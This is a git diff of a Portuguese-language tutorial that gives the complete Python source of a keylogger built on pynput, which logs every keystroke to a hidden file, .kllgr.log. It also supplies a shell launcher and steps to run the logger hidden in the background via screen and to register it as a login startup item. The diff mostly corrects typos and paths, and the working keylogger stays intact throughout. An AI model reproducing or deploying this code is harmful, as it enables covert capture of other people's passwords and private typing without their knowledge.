@@ -1,16 +1,15 @@
-# Felipe Tanii
+ # Felipe Tanii
 ----- Instalar os pacotes:
 $ sudo apt install python3-pip
 $ pip3 install pynput
-$ sudo apt install screen 
-- A seguir substitua "sp" pelo nome da sua pasta de usuario!
-$ cd /home/sp 
-$ nano .kllgr.py 
------- Copie e cole no nano com shit+ctrl+v (antes altere o nome da pasta sp)
+$ sudo apt install screen
+$ cd ~
+$ nano .kllgr.py
+------ Copie e cole no nano com shit+ctrl+v
 # Felipe Tanii 2020 12 1
 from pynput.keyboard import Listener
 import re
-arquivoLog = '/home/sp/.kllgr.log' # pasta de usuario
+arquivoLog = '.kllgr.log'
 def capturar(tecla):
     tecla = str(tecla)
     tecla = re.sub(r'\'', '', tecla)
@@ -20,48 +19,45 @@ def capturar(tecla):
     tecla = re.sub(r'enter', '\n', tecla)
     tecla = re.sub(r'shift', '', tecla)
     with open(arquivoLog, 'a') as log:
-        log.write(tecla) 
+        log.write(tecla)
 with Listener(on_press=capturar) as l:
-    l.join() 
+    l.join()
 ----------------------------------------
 - ctrl+o para salvar
 - Enter
 - ctrl+x para sair
 $ nano .kllgr.sh
------- Copie e cole no nano com shit+ctrl+v (antes altere o nome da pasta sp)
+------ Copie e cole no nano com shit+ctrl+v
 #!/bin/sh
 # Felipe Tanii 2020 12 1
-python3 /home/sp/.kllgr.py &   # pasta de usuario
+python3 .kllgr.py &  
 screen &&
 exit
 ----------------------------------------
 - ctrl+o para salvar
 - Enter
 - ctrl+x para sair
-$ chmod +x .kllgr.sh     (o torna executavel)
+$ chmod +x .kllgr.sh     (o torna executável)
 -------------------- Para executar ao iniciar -----------------------
 ----------------------------------------
-- Nos aplicavos do ubuntu busque “Alipcativos iniciais de sessao”.
-- Em adicionar, navegar adicione /home/~/.kllgr.sh 
+- Nos aplicativos do Ubuntu busque “Aplicativos iniciais de sessão”.
+- Em adicionar, navegar adicione o .kllgr.sh
 - Nomeie como kllgr e reinicie
-- O arquivo esta oculto em .kllgr.log na sua pasta de usuario
+- O arquivo esta oculto em .kllgr.log na sua pasta de usuário
 - ctrl + h para visualizar arquivos ocultos
 ----------------------------------------
 
 ------------------ OU -----------------------------------------------
 
------- Usar o kllgr sem reiniciar ou adidcionar na inicializacao
+------ Usar o kllgr sem reiniciar ou adicionar na inicialização
 - No terminal:
-$ screen	(abre primeira sessao)
+$ screen    (abre primeira sessão)
 (tap space)
-$ python3 .kllgr.py &		(Executa & libera)
-$ screen &&					(Abre nova sessao)
-(close terminal)
-$ ps ax | grep .kllgr.py	(ver se executando)
-$ kill (numero do PID)		(mata o processo)(desliga o kllgr)
+$ python3 .kllgr.py &        (Executa & libera)
+$ screen &&                    (Abre nova sessao)
+(fechar o terminal)
+$ ps ax | grep .kllgr.py    (ver se executando)
+$ kill (numero do PID)        (mata o processo)(desliga o kllgr)
 ----------------------------------------
 
-
-
-
-
+https://drive.google.com/drive/folders/1UqV69RviZA33gwzpksaSQLFfOGfW97nX?usp=sharing
